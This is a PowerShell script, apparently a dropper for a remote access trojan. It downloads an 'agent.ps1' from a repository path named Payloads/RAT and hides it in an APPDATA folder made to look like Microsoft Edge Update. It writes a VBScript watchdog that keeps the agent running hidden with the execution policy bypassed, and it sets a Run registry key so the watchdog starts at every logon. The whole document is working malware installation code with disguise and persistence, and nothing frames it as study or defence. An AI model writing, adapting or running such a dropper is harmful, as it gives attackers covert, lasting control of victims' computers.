Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

$installDir = Join-Path $env:APPDATA "MicrosoftEdgeUpdate"
New-Item -ItemType Directory -Force -Path $installDir

$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $installDir "agent.ps1")

$agentPath = Join-Path $installDir "agent.ps1"
$vbsPath = Join-Path $installDir "launcher.vbs"

@"
Set objShell = CreateObject("WScript.Shell")
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")

Do While True
    Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
    agentRunning = False
    For Each process In processes
        If InStr(process.CommandLine, "agent.ps1") > 0 Then
            agentRunning = True
        End If
    Next
    If Not agentRunning Then
        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
    End If
    WScript.Sleep 30000
Loop
"@ | Set-Content $vbsPath

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
}
Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -Value "wscript.exe `"$vbsPath`""

Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
exit
